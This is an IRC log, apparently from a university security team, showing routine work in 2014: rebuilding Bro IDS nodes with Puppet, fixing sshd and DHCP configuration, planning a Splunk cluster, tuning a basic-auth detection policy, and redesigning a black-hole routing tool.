2014-09-02 11:41:44	soehlert	ah right, that's what i was basically going to do by letting tcpdump available to non root users
2014-09-02 13:40:39	soehlert	jazoff: you ready to get going on this?
2014-09-02 13:41:34	jazoff	ok
2014-09-02 13:41:52	jazoff	is eyrich around to mess with the gigamon?
2014-09-02 13:42:29	eyrich	a little, on a call right now
2014-09-02 13:42:47	jazoff	soehlert: you want to do one at a time or all 4?
2014-09-02 13:42:52	jazoff	if we are doing all 4 it doesnt matter
2014-09-02 13:43:12	soehlert	all 4 i guess. lets just do it and be done with it instead of doing a little at a time and extra work
2014-09-02 13:43:28	jazoff	ok. can we do the manager later?
2014-09-02 13:43:33	jazoff	or did you want to do that today as well?
2014-09-02 13:43:35	soehlert	how much later?
2014-09-02 13:43:46	jazoff	tomorrow?
2014-09-02 13:43:48	soehlert	tomorrow at the latest would be great
2014-09-02 13:43:55	soehlert	perfect
2014-09-02 13:45:34	soehlert	ok so i guess shut down the cluster please
2014-09-02 13:49:29	jazoff	ok..
2014-09-02 13:49:52	jazoff	so this way we can redeploy bro from the manager and ensure the workers are OK
2014-09-02 13:49:56	jazoff	before reformatting the manager
2014-09-02 13:50:37	soehlert	yup that makes sense to me
2014-09-02 13:54:54	soehlert	is the cluster off? 
2014-09-02 13:57:12	jazoff	oh, off, derr, i turned off bro
2014-09-02 13:57:15	jazoff	lemme shutdown the workers
2014-09-02 13:57:23	jazoff	or which did you mean?
2014-09-02 13:59:01	soehlert	i meant bro sorry
2014-09-02 13:59:07	jazoff	ok. bro is off :)
2014-09-02 13:59:12	soehlert	cool here we go
2014-09-02 14:07:07	soehlert	jazoff: i forgot my yubikey can you go into nagios and take care of these hosts please?
2014-09-02 14:08:19	jazoff	how does one go into nagios again? :)
2014-09-02 14:08:34	soehlert	portal-sec
2014-09-02 14:08:53	soehlert	use your security ad creds and then the thruk one in lastpass
2014-09-02 14:08:59	jazoff	ah
2014-09-02 14:10:01	jazoff	there it goes.. it kept trying to use my creds
2014-09-02 14:10:37	jazoff	nagios hasn't said they are down yet
2014-09-02 14:10:44	jazoff	i wonder if they are not being monitored directly ( just bro-dev )
2014-09-02 14:11:32	soehlert	not down but its thrown up a lot of alerts thats for sure
2014-09-02 14:11:40	soehlert	for everythign else
2014-09-02 14:12:07	jazoff	oh, there it goes
2014-09-02 14:12:34	jazoff	errr
2014-09-02 14:12:39	jazoff	i don't see it in the web interface
2014-09-02 14:15:09	soehlert	is it paginated or something? we're definitely getting alerts in IRC about it
2014-09-02 14:17:47	jazoff	yeah, it just shows drought and subzero
2014-09-02 14:23:06	soehlert	argh wtf..can grab the img file ok, but ignoring the kickstart file..
2014-09-02 14:50:11	soehlert	jazoff: nids-dev1 is added to puppet (but no role::profile) you can ssh from fog as yourself. can you please get it puppetized and up and running?
2014-09-02 14:50:35	jazoff	cool
2014-09-02 15:10:37	soehlert	ditto 2
2014-09-02 15:24:12	jazoff	ok, created a group called bro worker
2014-09-02 15:39:12	soehlert	ok. 3 is ready
2014-09-02 15:54:38	soehlert	ughhh now four can't get dhcp? really...?
2014-09-02 16:00:21	soehlert	anyone got ideas? nothing has changed since i kickstarted the other 3, i see the requests coming in but no replies..
2014-09-02 16:02:38	soehlert	dhcpd is running
2014-09-02 16:04:20	jazoff	does it think it has no leases free?
2014-09-02 16:04:31	jazoff	is it still holding on the leases for 1-3?
2014-09-02 16:10:26	soehlert	ahhh i bet thats it good call
2014-09-02 16:10:37	soehlert	forgot we moved it to only 3
2014-09-02 16:21:00	jazoff	puppet working its way through the modules
2014-09-02 16:22:46	jazoff	hm, kernel stuff missing preventing pfring kernel module from building, otherwisr most of the way there
2014-09-02 16:23:21	jazoff	odd, I install the kernel-devel package
2014-09-02 16:24:06	jazoff	oh, i think it needs a reboot for the new kernel
2014-09-02 16:24:24	jazoff	rebooting
2014-09-02 16:26:14	jazoff	hmmmm
2014-09-02 16:26:16	jazoff	earth to nids-dev1
2014-09-02 16:28:39	jazoff	there it goes
2014-09-02 16:29:38	jazoff	much better
2014-09-02 16:34:14	jazoff	soehlert: edited the puppet configs on 1-3 and changed production to development
2014-09-02 16:41:21	soehlert	cool
2014-09-02 16:41:28	soehlert	if you still got some time, just finished up 4
2014-09-02 16:41:32	jazoff	k
2014-09-02 16:48:21	jazoff	ok, here it goes
2014-09-02 16:48:37	jazoff	ah, need to fix known hosts
2014-09-02 16:48:52	jazoff	ssh-keygen -R nids-dev1 etc
2014-09-02 16:49:38	jazoff	oh, and move they key manually to authorized keys
2014-09-02 16:49:58	jazoff	oh, no.. it should have it
2014-09-02 16:50:01	jazoff	must be the sshd config
2014-09-02 16:50:17	jazoff	soehlert: are dev boxes getting some new sshd config now? :)
2014-09-02 16:50:24	jazoff	[root@bro-dev ~]# ssh nids-dev1
2014-09-02 16:50:25	jazoff	Permission denied (gssapi-keyex,gssapi-with-mic).
2014-09-02 16:50:30	jazoff	bro needs key auth...
2014-09-02 16:54:38	jazoff	guess we need another ssh type?
2014-09-02 17:17:34	jazoff	also, nids-dev4 seems to have not rebooted
2014-09-02 17:55:58	soehlert	ahhh damn. they should have the same sshd config they were getting a few weeks ago.
2014-09-02 20:24:51	jazoff	hmm, wonder why it wasn't workign then
2014-09-02 20:25:50	jazoff	oh, and nids-dev4 is ok, it just didnt get its role yet so i thhink it is missing the ssh rules from bro-dev
2014-09-02 20:27:28	jazoff	the config has PubkeyAuthentication no
2014-09-02 20:28:13	jazoff	not sure how it was working before, but it seems to have the config from puppet
2014-09-03 08:16:20	jazoff	hmm, some activity from 109.98.48.113 (romania) yesterday
2014-09-03 08:16:51	jazoff	ssh and http logins to dev-tools.informatics.illinois.edu
2014-09-03 08:23:50	jazoff	odd.. the site that was running seems to not exist anymore, you just get an nginx defualt page
2014-09-03 08:35:08	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Connection reset by peer)
2014-09-03 09:05:59	-->	eyrich (eyrich@D077DE37.62651FD3.B1B5B983.IP) has joined #security
2014-09-03 09:32:54	jazoff	ok, I think i got the workers going again
2014-09-03 10:41:29	wardog	did you contact anyone about that romanian host? If not I can
2014-09-03 10:44:47	jazoff	couldn't hurt.. not sure what is up with that server
2014-09-03 10:45:32	jazoff	would be nice if we got syslog from that host :)
2014-09-03 10:59:02	soehlert	jazoff: as far as the puppet stuff goes on the nids boxes, did you create a new config for them? i think we just need to do another match directive for root logins and pubkey right?
2014-09-03 10:59:18	jazoff	yeah, i made a new file that allows pubkey + root
2014-09-03 10:59:32	soehlert	perfect thanks.
2014-09-03 10:59:37	soehlert	hows it all running on centos?
2014-09-03 10:59:42	jazoff	seems ok
2014-09-03 10:59:54	jazoff	ran into some minor things that were easy to fix
2014-09-03 11:00:02	jazoff	not so much due to centos just due to it being a fresh install
2014-09-03 11:00:38	soehlert	gotcha. can we do the manager in just a bit here?
2014-09-03 11:05:02	jazoff	yeah, just need to grab some files off it
2014-09-03 11:06:55	soehlert	ok lemme know
2014-09-03 11:11:08	jazoff	ok, i think it is good to go
2014-09-03 11:11:36	soehlert	ok, here we go..
2014-09-03 11:16:51	wardog	Yeah, that host is weird. it's also hosting their wiki on a different virtualhost.
2014-09-03 11:31:11	jazoff	Ah, Boris, that'll do it
2014-09-03 11:34:49	soehlert	ahhh shoulda known it was him
2014-09-03 11:35:10	soehlert	Romania? check. Weird set up? check.
2014-09-03 11:37:15	wardog	sigh. boris. that makes me thing of moose and squirrel.
2014-09-03 11:37:16	soehlert	jazoff: bro-dev is ready for you
2014-09-03 11:37:24	soehlert	hahah that's always what i think of too
2014-09-03 11:38:46	jazoff	kerberos?
2014-09-03 11:41:28	soehlert	yup
2014-09-03 11:41:37	soehlert	you need a new token remember?
2014-09-03 11:42:51	jazoff	oh
2014-09-03 11:42:54	jazoff	suuuure I do :)
2014-09-03 11:43:46	soehlert	either you do or bro-dev decided it's had enough of your stuff and won't let you in
2014-09-03 11:52:27	wardog	woohoo. Looks like my pfsense box is out for delivery today.
2014-09-03 11:54:32	soehlert	did you just reboot bro-dev jazoff?
2014-09-03 11:54:38	jazoff	yes
2014-09-03 11:55:01	jazoff	there are a ton of updates including kernel stuff after the kickstart
2014-09-03 11:55:20	jazoff	I wouldn't notice except building the pfring stuff fails until it is rebooted
2014-09-03 11:56:04	soehlert	gotcha.
2014-09-03 11:56:24	soehlert	just curious because the monitor is still plugged in
2014-09-03 11:56:32	jazoff	ah
2014-09-03 11:56:37	jazoff	it taking it's time to reboot?
2014-09-03 11:57:43	soehlert	nope its up and running
2014-09-03 11:57:56	jazoff	there it goes
2014-09-03 11:58:08	wardog	Do we have a box available for new Splunk?
2014-09-03 11:58:16	jazoff	ah, forgot to change the env to dev
2014-09-03 11:58:38	wardog	I think there are a few days left before the review period for campus on the Splunk sole source.
2014-09-03 12:00:40	soehlert	wardog: ya we have a bunch of boxes available.
2014-09-03 12:00:40	soehlert	i can set one up today if you want
2014-09-03 12:00:50	soehlert	or at least kickstart one and pass it along to jazoff that is
2014-09-03 12:09:19	soehlert	yes, no?
2014-09-03 12:13:07	jazoff	fine by me
2014-09-03 12:13:08	wardog	yeah, that sounds good. Kickstart one and whenever jazoff has time to set it up he can. We don't have the campus license yet so there's no hurry.
2014-09-03 12:13:20	jazoff	now, were we going to do the whole cluster thing?
2014-09-03 12:13:32	soehlert	does that mean you want two machines?
2014-09-03 12:13:49	jazoff	depends on what the longer term plan is
2014-09-03 12:14:10	wardog	I'm good with with clustering
2014-09-03 12:14:17	wardog	That's separates the search heads from the indexers right?
2014-09-03 12:14:32	jazoff	yeah, we would probably run the search head and the manager thing in vmware
2014-09-03 12:14:41	wardog	yeah, I like that.
2014-09-03 12:18:09	soehlert	oh so just one physical machine for now then?
2014-09-03 12:18:36	jazoff	i need to double check the docs again, but i think if you want to setup a 2 node cluster it is eaiest to have both nodes at the start
2014-09-03 12:20:31	wardog	Yeah, 1 physical it sounds like.
2014-09-03 12:21:22	soehlert	well right, but i'll do one physical machine and then a vm. and just dont do the splunk stuff until they are both set up?
2014-09-03 12:23:40	wardog	well, it may not be a bad idea to start seeing if we can start integrating splunk with Duo/LDAP perhaps.
2014-09-03 12:24:24	soehlert	ugh you guys are the worst :) what do you want me to do right now to aid in the splunk movement?
2014-09-03 12:25:39	wardog	just spin up a physical and a vm and let them sit. I think the search should probably sit on public and the indexer in internal?
2014-09-03 12:26:17	soehlert	so physical is public?
2014-09-03 12:26:23	jazoff	wait wait wait
2014-09-03 12:26:44	jazoff	it doesn't make sense to use a cluster deployment with only one idexer
2014-09-03 12:27:53	wardog	then 2 physical
2014-09-03 12:29:00	soehlert	so 2 physical and they should be public or private?
2014-09-03 12:29:07	jazoff	private
2014-09-03 12:30:05	wardog	oh wait. We can still send all we need to it while in private, right? 
2014-09-03 12:30:19	wardog	Now and down the road?
2014-09-03 12:30:19	jazoff	i don't see why not
2014-09-03 12:30:21	wardog	k
2014-09-03 12:30:23	wardog	then yes.
2014-09-03 12:30:46	jazoff	may need 1 or 2 pfsense rules, but that's about it
2014-09-03 12:30:59	soehlert	ok 2 private hosts coming up
2014-09-03 12:31:54	jazoff	bro-dev working
2014-09-03 12:32:34	soehlert	cool
2014-09-03 12:32:41	soehlert	whats up with drought?
2014-09-03 12:33:01	jazoff	i can't even connect to it right now
2014-09-03 12:33:05	jazoff	what is up indeed
2014-09-03 12:36:35	soehlert	well it would appear the box labelled drought is not drought so drought is currently powered off and in rack 5..
2014-09-03 12:36:44	jazoff	ah
2014-09-03 12:36:53	jazoff	wardog: so.. about that web server with boris...
2014-09-03 12:38:00	jazoff	bro sees stuff like
2014-09-03 12:38:04	jazoff	POST dev-tools.informatics.illinois.edu/users/sign_in
2014-09-03 12:38:18	jazoff	so, not over https
2014-09-03 12:38:20	jazoff	from romania
2014-09-03 12:38:21	wardog	yeah.
2014-09-03 12:38:42	wardog	Totally did not even think about that....
2014-09-03 12:38:48	wardog	I'll send a note.
2014-09-03 12:39:28	soehlert	jazoff: i presume you're gonna need me to find the real drouhgt and I cant just centos a new box for you to use to rebuild it?
2014-09-03 12:40:00	jazoff	oh, that works too, as long as it has a myricom card in it
2014-09-03 12:40:12	jazoff	basically bro-dev was easy since it was 100% puppet from day one
2014-09-03 12:40:29	jazoff	but supercell had some stuff installed before puppet like the myricom drivers so I need to figure that part out
2014-09-03 12:40:50	jazoff	soon as that is implemented redoing the prod cluster should be just as easy as the dev cluster
2014-09-03 12:42:23	soehlert	ok i can give you one with a myricom card already plugged in and everything. the one i thought was drought
2014-09-03 12:42:34	jazoff	ah
2014-09-03 12:42:39	jazoff	this is probably why eyrich was having trouble
2014-09-03 12:42:55	jazoff	so, if that box is not drought, what is it?
2014-09-03 12:43:09	soehlert	it was one of the workers from when drought had a 2 box cluster under it
2014-09-03 12:43:51	eyrich	at least we know now
2014-09-03 12:43:58	jazoff	ah
2014-09-03 12:44:19	soehlert	yup, the plus side is its already set up in the gigamons too :)
2014-09-03 12:57:00	soehlert	eyrich: can you make a port on the switch in rack one public for me please?
2014-09-03 13:00:52	eyrich	tell me which port you want to use
2014-09-03 13:00:57	eyrich	to make nice cable
2014-09-03 13:01:02	soehlert	24
2014-09-03 13:01:06	soehlert	to make nice cable?
2014-09-03 13:01:12	eyrich	:)
2014-09-03 13:02:05	eyrich	tell me description
2014-09-03 13:02:10	soehlert	drought
2014-09-03 13:02:52	eyrich	what interface?
2014-09-03 13:03:00	soehlert	second nic
2014-09-03 13:03:39	eyrich	commiting now
2014-09-03 13:05:16	soehlert	thanks
2014-09-03 13:37:14	eyrich	can ne1 get to sects01, I cant duo auth again
2014-09-03 13:37:59	eyrich	nevermind - code worked, but not push
2014-09-03 13:38:07	eyrich	might be my phone
2014-09-03 14:24:18	soehlert	eyrich can you do another port switch for me please? rack 1 port 34 for subzero nic 2
2014-09-03 14:24:32	eyrich	what vlan?
2014-09-03 14:26:23	soehlert	public
2014-09-03 14:26:53	jazoff	subzero is public?
2014-09-03 14:27:25	soehlert	dual
2014-09-03 14:28:01	eyrich	commiting
2014-09-03 14:28:38	soehlert	thanks
2014-09-03 15:45:30	jazoff	my dog is completely unphased by lightning striking so close the room shakes
2014-09-03 15:46:21	jazoff	also doesn't really mind the vaccuum.. sometimes I wonder 
2014-09-03 15:46:54	eyrich	i wish mine were that way. 
2014-09-03 15:47:13	jazoff	yeah, someone on reddit talked about how their dog shits itself everytime there is thunder
2014-09-03 15:47:44	jazoff	she just looks bored because she can't run around outside all day anymore
2014-09-03 16:08:43	jazoff	eyrich: I added some notes to https://wiki.ncsa.illinois.edu/display/CSD/Black+Hole+Routing about improvements for BHR
2014-09-03 16:08:53	jazoff	some things that will be required, some things that would be nice to have
2014-09-03 16:17:05	jazoff	one thing that might be useful is to find out from cites if they have a perferred tech stack
2014-09-03 16:17:28	jazoff	since likely a ton of changes need to be made I wouldn't mind starting over in python.. from what I recall they like python too :)
2014-09-04 09:06:31	eyrich	soehlert: when did you want to meet at NPCF?
2014-09-04 09:39:43	soehlert	im here now, whenever you wanna come by
2014-09-04 09:45:47	eyrich	ok omy
2014-09-04 09:45:52	eyrich	omw
2014-09-04 09:46:15	eyrich	do I need a laptop? or just a screwdriver?
2014-09-04 09:47:48	wardog	Shotgun and a 1/5th...
2014-09-04 09:48:56	soehlert	shouldnt need your laptop
2014-09-04 09:49:00	eyrich	ok
2014-09-04 09:53:13	wardog	jazoff: is there a bro policy that detects basic auth?
2014-09-04 09:59:36	soehlert	so i'm gonna be reinstalling seclogs today. anyone see a reason that will cause big problems?
2014-09-04 10:02:32	jazoff	wardog: i think so
2014-09-04 10:02:53	jazoff	yeah, ./http-basic-auth
2014-09-04 10:03:05	jazoff	          NOTICE([$note=HTTP::Basic_Auth_Server,
2014-09-04 10:03:32	soehlert	also jazoff, can i do flows-sec? will that be an easy one
2014-09-04 10:03:53	jazoff	in theory...
2014-09-04 10:04:30	wardog	jazoff: we should probably notify on that for http_inbound.
2014-09-04 10:04:38	wardog	If we aren't already.
2014-09-04 10:10:41	soehlert	so can we test that theory out?
2014-09-04 10:13:00	jazoff	do we still have the old netflow box?
2014-09-04 10:13:05	jazoff	can we just setup a new one and swap the ip again?
2014-09-04 10:13:35	jazoff	otherwise in theory puppet should set everything back up
2014-09-04 10:14:09	soehlert	i suppose we can go that route. we have a few extras
2014-09-04 10:15:43	jazoff	wardog: i can.. i checked splunk, there are some hits recently
2014-09-04 10:15:53	jazoff	though I bet a lot are scanners
2014-09-04 10:22:24	wardog	Well, if anything it should let us know who should move to SSL.
2014-09-04 10:25:24	jazoff	there's a lot of internal stuff too.. do we care about those?
2014-09-04 10:25:57	jazoff	Basic Access Authentication is in use username: ncsa_netops 141.142.132.2 192.17.81.4
2014-09-04 11:11:35	wardog	looks like their intermapper hose.
2014-09-04 11:11:38	wardog	host.
2014-09-04 11:11:44	wardog	Or.. Campus' intermapper host.
2014-09-04 11:11:49	wardog	interesting.
2014-09-04 11:39:33	wardog	jazoff: is there a particular plugin system/framework you use for python programs you write, like for ninfo for example?
2014-09-04 11:39:34	ncsabot	Error running plugin
2014-09-04 11:39:46	wardog	ncsabot: lol
2014-09-04 11:42:56	jazoff	yeah, n info uses setuptools entry points
2014-09-04 11:43:08	jazoff	which lets individual packages registry plugins that get picked up by the main program
2014-09-04 11:43:43	jazoff	i saw this recently: http://stevedore.readthedocs.org/en/latest/
2014-09-04 11:56:10	jazoff	wardog: so do we care about internal -> internal http basic auth?
2014-09-04 11:56:32	wardog	well, 192.17.81.4 is actually CITES. I know we peer, but it's not internal.
2014-09-04 11:56:45	wardog	Uh, yes. I think we should be aware of internal.
2014-09-04 12:33:37	jazoff	ok, just not internal -> external, right?
2014-09-04 12:33:55	wardog	Hmmm
2014-09-04 12:34:28	wardog	Maybe just to univeristy IPs?
2014-09-04 12:43:15	jazoff	ah, I can define neighbor_nets to include CITES
2014-09-04 12:43:39	jazoff	so then it would email on (local -> local or local -> neighbor)
2014-09-04 12:43:42	jazoff	does that sound right?
2014-09-04 12:43:51	wardog	sounds good
2014-09-04 12:44:19	wardog	can we update that neighbor table through portal-sec?
2014-09-04 12:44:40	jazoff	if you really wanted to, I was just goign to hardcode it since it isn't going to change often
2014-09-04 12:44:51	jazoff	in the meantime, you can do this search in splunk:
2014-09-04 12:44:53	jazoff	Basic_Auth_Server | top id_orig_h id_resp_h sub
2014-09-04 12:44:58	wardog	cool
2014-09-04 12:46:34	jazoff	you happen to have the list of the cites netblocks?
2014-09-04 12:46:38	jazoff	or just know what they are :)
2014-09-04 12:46:57	wardog	http://www.cites.illinois.edu/dns/oncampus-ranges.html
2014-09-04 12:47:45	jazoff	just a few
2014-09-04 12:51:02	wardog	I was wondering if we should also include blocks associated with XSEDE
2014-09-04 12:51:26	jazoff	couldn't hurt
2014-09-04 12:52:05	wardog	Just don't know what those blocks are.
2014-09-04 13:20:57	soehlert	eyrich: can you do a port change for me please? i removed the cable from rack 2 port 5. there is going to be a cable from seclogs first nic into port 0 of rack 3 and please put it on the public vlan
2014-09-04 13:23:17	eyrich	committing now
2014-09-04 13:24:36	eyrich	fyi i have meetings from 1:30 to 3
2014-09-04 13:24:40	eyrich	no laptop
2014-09-04 13:28:47	soehlert	thats fine. i gotta run for dog appointment in just a bit
2014-09-04 13:53:29	jazoff	holy crap is it raining hard here
2014-09-04 14:12:08	soehlert	gotta run for dog appointment, might be back later depending how long it takes. if not, ill see you next week IRC
2014-09-04 14:20:53	wardog	gotta run some errands then will finish the day from home.
2014-09-04 15:19:19	wardog	soehlert: is the xsede wiki out of Zone 1b?
2014-09-04 15:19:28	wardog	I suppose I can test.....
2014-09-04 15:20:01	wardog	Looks like it is
2014-09-04 15:27:42	wardog	I'm guessing all these additional files in /etc/httpd/conf.d are from puppet and duplicate a number of directives from httpd.conf?
2014-09-04 15:29:41	wardog	wiki-sec is supposed to be just for the XSEDE wiki and jabber server, right?
2014-09-04 15:52:14	jazoff	that's what it was from what I remember
2014-09-04 15:54:28	wardog	If I update one of those files, will it be overwritten?
2014-09-04 15:55:02	wardog	It looks like it's loading two different virtualhost configurations.
2014-09-04 15:55:25	wardog	Which doesn't matter, I suppose, since port 80 should be disabled. ssl config is in a different file.
2014-09-04 15:56:33	wardog	Ug...
2014-09-04 15:56:48	wardog	This packaged version of mediawiki is giving me a fricken headache.
2014-09-04 15:58:11	jazoff	looks like the mediawiki puppet module currently just sets up some fw rules
2014-09-04 15:58:29	wardog	weird. wonder where all these files came from then
2014-09-04 15:58:49	jazoff	what does the motd on the box say ?
2014-09-04 15:59:03	jazoff	nm,  can login too :)
2014-09-04 15:59:09	jazoff	yeah, it's not even getting any classes
2014-09-04 16:00:17	wardog	I think I'm going to dump the RPM install of mediawiki. I think it's causing more problems than it's worth
2014-09-05 09:03:10	wardog	CITES is offering anti-gravity https://twitter.com/CITES_NetEng/status/507890915403628544
2014-09-06 04:16:18	<--	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has quit (Ping timeout)
2014-09-06 08:03:46	-->	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has joined #security
2014-09-08 08:15:17	eyrich	no more cert error when connecting to sects01 :)
2014-09-08 09:04:06	wardog	Can you get a cert onto the bhr system too?
2014-09-08 09:37:22	eyrich	i can approve one- i suggested to neteng last week that they send me a CSR for the system
2014-09-08 10:12:49	<--	eyrich (eyrich@D077DE37.62651FD3.B1B5B983.IP) has quit (Quit: Leaving.)
2014-09-08 10:23:04	-->	eyrich (eyrich@D077DE37.62651FD3.B1B5B983.IP) has joined #security
2014-09-08 13:18:17	eyrich	does kick start still need the install CDrom mounted?
2014-09-08 13:21:31	eyrich	jschipp: relay01-sec needs storage migrated
2014-09-08 13:21:38	eyrich	can we coordinate a power off so I can do that
2014-09-08 13:36:17	jazoff	Mostly have new BHR design stuff worked out
2014-09-08 13:36:47	jazoff	still trying to figure out the optimal table design 
2014-09-08 13:43:31	jazoff	also, I think the current system has a potential race condition that I ran into at UA
2014-09-08 13:43:51	jazoff	if two blocks try to get added at the same time for the same ip you end up with duplicate records
2014-09-08 13:44:10	jazoff	i managed to fix it at UA with a weird unique index, but there is probably a better way
2014-09-08 13:48:48	jschipp	sure, do it now?
2014-09-08 13:48:50	jschipp	eyrich: 
2014-09-08 13:54:28	eyrich	migrating now
2014-09-08 14:01:21	eyrich	gonna take a while - large drive images
2014-09-08 14:01:56	jschipp	kk
2014-09-08 15:42:51	jschipp	eyrich: let me know when it's complete
2014-09-08 16:08:52	eyrich	jschipp: is it ok to start the VM when it is done?
2014-09-08 16:10:21	eyrich	its at 79%
2014-09-08 16:57:34	eyrich	relay01-sec coming online
2014-09-09 09:34:32	jazoff	eyrich: have a lot of the new BHR stuff working :)
2014-09-09 09:34:49	wardog	what are the new features?
2014-09-09 09:34:57	jazoff	https://wiki.ncsa.illinois.edu/display/CSD/Black+Hole+Routing
2014-09-09 09:35:16	jazoff	i'm trying to reimplement it using django and django-rest-framework (like the portal uses)
2014-09-09 09:35:52	jazoff	so I have it working that you can add a block, get the block queue for 'bgp1', then mark that as blocked, then another host can get the block queue for bgp2 etc
2014-09-09 09:36:25	jazoff	was a little tricky since there are a few ways to view the 'current' block list
2014-09-09 09:36:57	jazoff	there's hosts that should be blocked, hosts that are actually blocked, and hosts that should be blocked but haven't been yet
2014-09-09 09:42:42	jazoff	django-rest-framework is a bit of a pain to understand, but once  you get things hooked up is nice
2014-09-09 09:42:58	jazoff	so you get the user authentication using user/pass or authentication tokens
2014-09-09 09:51:07	wardog	How does it keep track of how long to block a host on a subsequent scan?
2014-09-09 09:51:48	jazoff	oh, I have not implementing the block scaling part yet
2014-09-09 09:52:04	jazoff	but it would be like the current one
2014-09-09 09:52:57	wardog	I'm thinking of the integration with CIF and eventually pushing the blocklist ips to CIF and giving them scores based on that scale.
2014-09-09 10:04:32	jazoff	hmm
2014-09-09 10:05:04	wardog	Are hosts forgotten over time or are they stored indefinately?
2014-09-09 10:05:07	jazoff	definitely need to make better use of cif, though i'm not sure what should integrate into what
2014-09-09 10:05:14	jazoff	block info is stored forever
2014-09-09 10:06:23	wardog	Say I trying to log into fog and fail and get blocked from my home IP. I realize my mistake, wait for the block to lift and log in. Then 1 month later I do it again. Will my IP be scaled up on this block?
2014-09-09 10:06:52	jazoff	based on how we have it now, no, a month is too far apart
2014-09-09 10:07:05	wardog	Ok, good
2014-09-09 10:07:12	wardog	That's what I was curious about.
2014-09-09 10:08:13	wardog	What if a host scans until its blocked and then disappears for a month and repeats this cycle? We should probably look for long term scanners like that.
2014-09-09 10:08:37	jazoff	yeah, that is one gap in the current code
2014-09-09 10:08:46	jazoff	but that should be easy to fix
2014-09-09 10:08:57	wardog	Analytics can pick it up through the block logs.
2014-09-09 10:08:59	wardog	yeah.
2014-09-09 10:09:11	jazoff	right, you could always do some reporting offline if you wanted to
2014-09-09 10:09:39	jazoff	right now it's just a function of the age of the last block, but it could be extended to take into account the number of recent blocks
2014-09-09 10:57:27	soehlert	does anyone know what this machine is? netflowsec-sec
2014-09-09 10:57:40	soehlert	its a vm and it seems to be doing nothing. thinking of getting rid of it
2014-09-09 11:01:28	jazoff	that's not the new netflow machine?
2014-09-09 11:05:37	soehlert	no that was hardware no?
2014-09-09 11:08:42	soehlert	plus the name of the machine is really netflowsec-dev
2014-09-09 11:30:11	jschipp	it's not mine
2014-09-09 11:32:42	eyrich	i think its a wardog from oct of last year
2014-09-09 11:33:21	jschipp	anyone know why nids-30 is down? and if it will be coming back up?
2014-09-09 11:38:14	soehlert	nids-30 doesnt exist anymore
2014-09-09 11:39:21	soehlert	it hasnt been used for a few years and i turned it into the new drought
2014-09-09 12:01:13	soehlert	jazoff: did you see this thread on bro list serve? [Bro] Bro and amplifications attacks
2014-09-09 12:01:55	jazoff	yeah.. need to reply
2014-09-09 12:02:39	soehlert	cool. hopefully someone's got a good idea we can steal if you still haven't thought of a better way
2014-09-09 12:10:53	soehlert	wardog: is netflowsec-dev yours? trying to figure out if i should just dump it or if it's needed
2014-09-09 12:18:31	wardog	hmm
2014-09-09 12:18:32	wardog	uh.
2014-09-09 12:18:34	wardog	Let me check
2014-09-09 12:18:59	wardog	If it was spun up before Justin joined us, then yes.
2014-09-09 12:19:40	wardog	uh. Where is it?
2014-09-09 12:20:26	soehlert	its on esxi
2014-09-09 12:20:26	soehlert	its also on the .156 net which seems....odd
2014-09-09 12:24:04	wardog	I took it offline. Canabalize the ip
2014-09-09 12:24:22	wardog	I think I was spinnning up a new netflow system almost a year ago and got sidetracked.
2014-09-09 12:24:30	wardog	It's shutting down now.
2014-09-09 12:30:42	soehlert	ahh ok
2014-09-09 12:30:45	soehlert	perfect
2014-09-09 12:31:23	wardog	Hey, what's the status of RHEL->CentOS Migration? Is that all done?
2014-09-09 12:36:13	jschipp	I have to complete CIF yet :(  working on it 
2014-09-09 12:36:18	jazoff	jschipp: git-sec is broked
2014-09-09 12:36:19	jschipp		modules/cif/files/apache.cif
2014-09-09 12:36:20	jschipp		modules/cif/files/httpd.conf
2014-09-09 12:36:20	jschipp		modules/cif/files/logrotate.cif
2014-09-09 12:36:20	jschipp		modules/cif/files/named.conf
2014-09-09 12:36:20	jschipp		modules/cif/files/pg_hba.conf
2014-09-09 12:36:21	jschipp		modules/cif/files/ssl.conf
2014-09-09 12:36:24	jschipp		modules/cif/files/user.cif
2014-09-09 12:36:26	jschipp		modules/cif/manifests/cif_dependencies.pp
2014-09-09 12:36:29	jschipp		modules/cif/manifests/cif_dns.pp
2014-09-09 12:36:31	jschipp		modules/cif/manifests/cif_preparation.pp
2014-09-09 12:36:45	jschipp	jazoff: when did you notice?
2014-09-09 12:37:03	jazoff	last night, forgot to check again until now
2014-09-09 12:37:56	wardog	Do we need to add nagios checks on that?
2014-09-09 12:38:25	jschipp	somehow it's mounted as read-only:
2014-09-09 12:38:26	jschipp	rm: cannot remove `/opt/gitlab-6.2.2-0/mysql/tmp/mysql.sock': Read-only file system
2014-09-09 12:38:29	jschipp	rm: cannot remove `/opt/gitlab-6.2.2-0/mysql/data/mysqld.pid': Read-only file system
2014-09-09 12:38:49	wardog	odd for a vm
2014-09-09 12:38:56	jschipp	rebooting for a quick fix
2014-09-09 12:40:37	jazoff	jschipp: dmesg ?
2014-09-09 12:40:40	jazoff	probably had filesystem errors
2014-09-09 12:45:45	wardog	eyrich: you hear back yet about the SAN?
2014-09-09 12:46:58	soehlert	wardog: not done, but moving along again pretty good. about 15 machines to go, but that includes the bro machines so that should be pretty easy once jazoff gets that myricom stuff set up
2014-09-09 12:49:58	jschipp	IO failure from dmesg
2014-09-09 12:50:16	jazoff	soehlert: is the drought/whatever box working?
2014-09-09 12:50:38	jschipp	I think eyrich migrated the VM to a new VSA box yesterday so I wonder if that could have done it
2014-09-09 12:51:38	soehlert	jazoff: not sure, thats my next task here in a little bit
2014-09-09 12:52:47	wardog	jschipp: sounds like a good excuse to do further tests on VM migrations.
2014-09-09 12:57:45	jschipp	I don't like excuses 
2014-09-09 12:57:52	jschipp	;)
2014-09-09 12:57:55	jschipp	git-sec is working now
2014-09-09 13:01:48	jschipp	I'll figure out a nagios check for detecting fs IO issues
2014-09-09 13:02:11	eyrich	VSA - is storage, only storage migration yesterday was relay01
2014-09-09 13:02:30	eyrich	i did do some live VM migration (host to host) 
2014-09-09 13:03:13	eyrich	that could have done it for git-sec, when did it bork>
2014-09-09 13:03:15	eyrich	?
2014-09-09 13:03:42	jschipp	yesterday, I don't have a timestamp -> dmesg :(
2014-09-09 13:04:16	eyrich	ok, then the live migration might have done that
2014-09-09 13:04:35	eyrich	not supposed to, but you know.... I did it on sects01 while I was using it and it went fine
2014-09-09 13:05:29	jschipp	all my other systems that were migrated seem to be fine so I'm betting git-sec had some fs inode issues prior to migration and then post migration it presented itself
